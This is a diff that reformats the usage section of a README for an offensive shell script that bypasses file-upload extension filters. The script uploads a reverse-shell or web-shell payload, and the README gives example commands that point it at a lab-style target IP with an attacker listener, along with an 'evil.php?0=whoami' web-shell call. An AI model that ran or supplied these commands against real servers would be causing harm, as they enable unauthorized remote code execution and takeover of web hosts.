@@ -3,17 +3,24 @@ A simple shell script that attempts to bypass extension blacklists for file uplo
 
 ## Usage
 
-  `-h`: Display this help message
-	`-i <IP_Addres>`: The IP Address to use for the Reverse Shell payload (i.e. your interface)
-	`-p <PORT>`: The port that your listener is running on
-	`-u <URL>`: The target URL that's used in POST Requests to upload a file
-	`-n <NAME>`: The 'name' attribute that's used in POST Requests (e.g. `file` for name="file")
-	`-e <URL>`: Exploit mode. Attempts to automatically trigger a Reverse Shell. Enter the URL where uploaded files are saved to.
-	`-b`: Basic payload instead of a Reverse Shell. Provide commands as the value of the 0 parameter (e.g. `/evil.php?0=whoami`) . Incompatible with `-e`
+`-h`: Display this help message
+
+`-i <IP_Addres>`: The IP Address to use for the Reverse Shell payload (i.e. your interface)
+
+`-p <PORT>`: The port that your listener is running on
+
+`-u <URL>`: The target URL that's used in POST Requests to upload a file
+
+`-n <NAME>`: The 'name' attribute that's used in POST Requests (e.g. `file` for name="file")
+
+`-e <URL>`: Exploit mode. Attempts to automatically trigger a Reverse Shell. Enter the URL where uploaded files are saved to.
+
+`-b`: Basic payload instead of a Reverse Shell. Provide commands as the value of the 0 parameter (e.g. `/evil.php?0=whoami`) . Incompatible with `-e`
 
  For example,
 
  `./uploader.sh -i 12.345.67.89 -p 1337 -u http://10.10.40.117/panel/ -n fileUpload -e http://10.10.40.117/uploads/`
+
  `./uploader.sh -i 12.345.67.89 -p 1337 -u http://10.10.40.117/panel/ -n fileUpload -b`
 
 ## Functionality
